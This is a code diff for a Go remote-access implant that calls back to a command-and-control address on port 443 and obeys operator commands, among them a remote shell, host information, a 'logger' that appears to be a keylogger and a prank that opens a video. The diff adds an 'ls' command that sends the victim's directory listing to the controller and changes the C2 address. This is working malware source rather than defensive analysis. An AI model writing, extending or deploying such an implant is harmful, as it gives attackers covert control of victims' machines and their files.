@@ -133,8 +133,18 @@ func cd(conn *net.Conn, command *string, pImplantWD *string) bool {
 	return false
 }
 
+func ls(conn *net.Conn, implantWD *string) {
+	dirFS, _ := os.ReadDir(*implantWD)
+	dirListing := ""
+	for e, _ := range dirFS {
+		dirInfo, _ := dirFS[e].Info()
+		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "		" + dirInfo.Name() + "\n"
+	}
+	(*conn).Write([]byte("\n" + dirListing + "\n"))
+}
+
 func main() {
-	c2Address := "192.168.0.102:443"
+	c2Address := "192.168.5.138:443"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -196,6 +206,10 @@ func main() {
 					logger(&conn)
 				}
 			}
+		case "ls\n":
+			{
+				ls(&conn, &implantWD)
+			}
 		case "rickroll\n": //I luv it
 			{
 				cmd := exec.Command("cmd", "/C", "start", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
@@ -206,7 +220,7 @@ func main() {
 		case "stop\n":
 			terminate()
 		default:
-			conn.Write([]byte("Available Commands: cd, hostinfo, logger, pwd, rickroll, shell, stop\n"))
+			conn.Write([]byte("Available Commands: cd, hostinfo, logger, ls, pwd, rickroll, shell, stop\n"))
 		}
 	}
 	//time.Sleep(10 * time.Second)
